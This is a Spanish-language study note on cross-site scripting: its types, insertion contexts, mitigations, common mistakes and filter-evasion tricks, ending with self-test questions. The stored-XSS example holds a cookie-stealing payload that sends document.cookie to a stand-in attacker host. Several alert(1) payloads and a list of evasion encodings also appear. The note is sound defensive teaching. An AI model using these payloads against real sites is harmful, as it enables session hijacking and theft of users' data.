# XSS (Cross-Site Scripting) — Fundamentos

> Nota de repaso. Bloque 04 — Web security.
> Fuentes: PortSwigger Web Security Academy (topic "What is XSS?"),
> OWASP XSS Prevention Cheat Sheet.

## Concepto

XSS es una vulnerabilidad que permite a un atacante inyectar **scripts ejecutables**
(generalmente JavaScript) en páginas web vistas por otras víctimas. El navegador de
la víctima ejecuta ese código en el **contexto de confianza del sitio vulnerable**,
con acceso a sus cookies, sesión y DOM de esa página.

## Condiciones para que exista

1. La aplicación recibe **input controlado por el atacante**.
2. Ese input se incluye en la respuesta HTTP o se procesa en el navegador.
3. No se aplica **validación + escapado contextual** adecuado.

## Tipos de XSS

### Reflected XSS

El payload viaja en la request y la aplicación lo refleja **inmediatamente** en la
respuesta, sin almacenarlo.

**Cómo se entrega:** URL maliciosa (phishing, email, QR, shortlink).

```html
<!-- URL: https://sitio.com/buscar?q=<script>alert(1)</script> -->
<p>Resultados para: <script>alert(1)</script></p>
```

**Impacto típico:** robo de sesión si la víctima abre el enlace estando logueada.

### Stored XSS (Persistent XSS)

El payload se **almacena** en el servidor (base de datos, comentario, perfil, log)
y se ejecuta cada vez que un usuario cargue el recurso afectado.

```html
<!-- Comentario almacenado -->
<script>fetch('https://attacker.com/?c='+document.cookie)</script>
```

**Impacto típico:** mayor alcance; afecta a todos los usuarios que vean el
contenido. No requiere que la víctima haga clic en un enlace específico.

### DOM-based XSS

El payload se ejecuta por manipulación del **DOM en el navegador**, sin que el
servidor reciba o devuelva el payload en la respuesta.

**Origen común:** JavaScript que lee de `location.hash`, `location.search`,
`document.URL`, `document.referrer`, `window.name`, etc., y lo inserta en el DOM
con métodos inseguros como `innerHTML`, `document.write`, `eval`, `setTimeout`.

```javascript
// Código vulnerable
var hash = location.hash.slice(1);
document.getElementById('output').innerHTML = hash;

// Payload: #<img src=x onerror=alert(1)>
```

**Impacto típico:** difícil de detectar del lado servidor; los WAFs no ven el
payload si viaja solo en el hash.

### Self-XSS

El atacante convence a la víctima para que pegue código malicioso en la consola
del navegador o en algún campo. No es una vulnerabilidad técnica pura del sitio,
pero se combina con ingeniería social.

## Cómo el navegador decide ejecutar

El navegador no ejecuta todo lo que parece HTML. Lo importante es el **contexto de
inserción**:

| Contexto | Ejemplo de payload | Mitigación |
|---|---|---|
| HTML body | `<script>alert(1)</script>` | HTML-encode `< > & " '` |
| Atributo HTML | `" onmouseover="alert(1)` | Encoding para atributos, comillas |
| JavaScript | `'; alert(1); //` | JS encoding, JSON serialization |
| URL | `javascript:alert(1)` | URL encoding, validar protocolo |
| CSS | `expression(alert(1))` | CSS encoding, no incluir input en estilos |

## Mitigaciones

1. **Escapado/encoding contextual:** nunca un solo método universal. Depende de
dónde se inserta el input.
2. **CSP (Content Security Policy):** política que reduce el impacto si el XSS
ocurre. No lo previene solo.
3. **HttpOnly cookies:** evita que JavaScript acceda a ciertas cookies, pero no
frena otros impactos de XSS (keylogging, redirección, CSRF por dentro).
4. **SameSite cookies:** mitiga envío de cookies en requests cross-site.
5. **Validación de input:** whitelist de tipos/formatos permitidos.
6. **Sanitización:** cuando se permite HTML enriquecido, usar librerías como
DOMPurify.
7. **No confiar en datos del cliente:** el servidor no debe renderizar datos sin
re-encodear, aunque "ya vengan de la base de datos".

## Errores comunes

- Creer que "reemplazar `<script>`" basta. Hay muchas etiquetas y event handlers.
- Usar regex para filtrar HTML: fácil de evadir con encoding, comentarios,
tabuladores, saltos de línea.
- Insertar input en JSON/JS sin escapar apropiadamente.
- Confiar en WAF como única defensa en lugar de encoding correcto.
- Pensar que `HttpOnly` elimina el riesgo de XSS; solo reduce el impacto del
robo de cookies.

## Variantes y técnicas de evasión

- **Encoding:** `&#x3c;`, `&#60;`, `%3C`, `\u003c`, tabuladores (`&#x09;`),
saltos de línea.
- **Etiquetas alternativas:** `<img onerror=...>`, `<svg onload=...>`,
`<body onscroll=...>`, `<iframe>`.
- **Protocolos peligrosos:** `javascript:`, `data:`.
- **Event handlers sin `<script>`:** `onerror`, `onload`, `onmouseover`,
`onfocus`, `onpointerenter`.
- **DOM-based:** manipulación vía `location.hash`, `window.name`.

## Autoevaluación

1. ¿Cuál es la diferencia clave entre Reflected y Stored XSS?
2. ¿Por qué DOM-based XSS puede pasar desapercibido para un WAF tradicional?
3. Si un sitio escapa `<` y `>` pero no comillas, ¿en qué contexto sigue siendo
vulnerable?
4. ¿Qué mitigación reduce el impacto pero NO previene que el XSS ocurra?
5. Nombra tres formas de evadir un filtro que solo busca la cadena `<script>`.
